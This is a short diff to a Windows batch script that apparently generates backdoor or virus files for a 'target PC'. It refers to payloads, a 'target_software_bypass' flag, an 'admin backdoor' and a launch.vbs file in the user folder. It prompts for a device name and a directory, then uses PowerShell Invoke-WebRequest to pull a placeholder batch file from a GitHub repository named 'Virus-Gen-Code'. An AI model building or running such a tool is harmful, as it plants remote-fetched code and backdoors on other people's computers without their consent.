@@ -1,10 +1,10 @@
-::startup
+:: startup
   :: setup
     :start
     @ECHO OFF
     set temp=0&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=true
     set update_number=V3.33.24
-    set dev=1
+    set dev=0
     title unstable Release %update_number%
     cls
   :: enter full screen
@@ -44,7 +44,6 @@
       if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
       :no_remove_backdoor
 :: manual configuration
-  :: ask if user has admin access on target PC
   echo current version: %update_number%
   echo.
   echo [31madmin backdoor is currently broken, do no use this[0m
@@ -56,9 +55,11 @@
   echo.  
   echo DO NOT USE SPACES, replace them with _
   echo.
-  set /p opt1=Device name:
+  set /p opt1=Device name: 
   echo where would you like to create the files
   echo if directory does not exist it will be created
+  echo.
+  set /p opt2=directory: 
 :: create all files needed
   :: create placeholder file
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder.bat").Content >%opt1%.bat
